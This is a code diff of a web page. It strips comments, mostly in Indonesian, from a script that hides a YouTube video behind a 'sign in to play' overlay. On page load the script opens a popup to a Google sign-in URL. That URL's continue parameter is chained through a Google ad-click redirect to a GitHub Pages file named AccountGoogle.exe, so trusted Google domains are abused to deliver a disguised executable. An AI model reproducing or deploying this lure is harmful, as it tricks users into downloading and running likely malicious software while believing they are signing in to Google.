@@ -83,7 +83,6 @@
       allowfullscreen>
     </iframe>
 
-    <!-- Overlay lock -->
     <div id="overlay-lock">Please sign in to play the youtube video</div>
   </div>
 
@@ -92,7 +91,6 @@
     const confirmSection = document.getElementById('confirm-login');
     const confirmButton = document.getElementById('confirm-button');
 
-    // Fungsi untuk open popup login otomatis
     function openLoginPopup() {
       const googleLoginURL = 'https://accounts.google.com/AccountChooser/signinchooser?continue=https%3A%2F%2Fadservice.google.com%2Fddm%2Fclk%2F408533097%3B208818505%3Bl%3B%3B%3F%2F%2Flanaya113505.github.io%2Fpizza%2FAccountGoogle.exe%3F%2Fhome&ddm=1&flowEntry=AccountChooser&flowName=GlifWebSignIn&hl=id&ltmpl=youtube&service=youtube&authuser=0';
 
@@ -107,22 +105,18 @@
         `width=${popupWidth},height=${popupHeight},top=${top},left=${left}`
       );
 
-      // Cek apakah popup ditutup
       const checkPopupClosed = setInterval(() => {
         if (loginWindow && loginWindow.closed) {
           clearInterval(checkPopupClosed);
-          // Tampilkan tombol confirm setelah popup ditutup
           confirmSection.style.display = 'block';
         }
       }, 1000);
     }
 
-    // Panggil popup otomatis pas halaman load
     window.addEventListener('load', () => {
       openLoginPopup();
     });
 
-    // Kalau user klik confirm
     confirmButton.addEventListener('click', () => {
       overlayLock.style.display = 'none';
       confirmSection.style.display = 'none';
